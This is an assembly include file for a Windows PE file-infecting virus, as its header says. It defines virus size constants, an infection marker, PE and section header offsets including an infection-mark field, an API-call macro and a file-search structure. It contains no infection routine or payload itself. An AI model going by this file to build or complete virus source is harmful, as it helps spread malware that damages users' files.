;------------------------------[ INFINITE.INC ]------------------------------;

;****************************************************************************
;** This is the include file for the constant and macros of the virus      **
;****************************************************************************

; Constants

virus_size      =       virus_end-virus_start
total_size      =       heap_end-virus_start
inf_mark        =       "AIAG"

security        =       20d                     ; Very important

PUSHAD_EDI      =       00h
PUSHAD_ESI      =       04h
PUSHAD_EBP      =       08h
PUSHAD_ESP      =       0Ch
PUSHAD_EBX      =       10h
PUSHAD_EDX      =       14h
PUSHAD_ECX      =       18h
PUSHAD_EAX      =       1Ch

; Some PE header stuff

MagicPE         =       00h
Machine         =       04h
NumberOfSections=       06h
EntrypointRVA   =       28h
CodeRVA         =       2Ch
FileAlignment   =       3Ch
MagicInfection  =       4Ch
SizeOfImage     =       50h
CheckSum        =       58h
PECharacteristics=      5Eh
DirEntryReloc   =       0A0h

; Some section header fields

SectionName     =       00h
VirtualSize     =       08h
VirtualAddress  =       0Ch
SizeOfRawData   =       10h
PtrToRawData    =       14h
PtrToReloc      =       18h
NumOfReloc      =       20h
Characteristics =       24h


; Macros

apicall         macro   api2call
                call    dword ptr [ebp+api2call-delta]
                endm

; Structures

WIN32_FIND_DATA         struc
dwFileAttributes        dd      ?
ftCreationTime          dq      ?
ftLastAccessTime        dq      ?
ftLastWriteTime         dq      ?
nFileSizeHigh           dd      ?
nFileSizeLow            dd      ?
dwReserved0             dd      ?
dwReserved1             dd      ?
szFileName              db      260 dup (?)
szAlternateFileName     db      13 dup (?)
			db      03 dup (?)
WIN32_FIND_DATA         ends


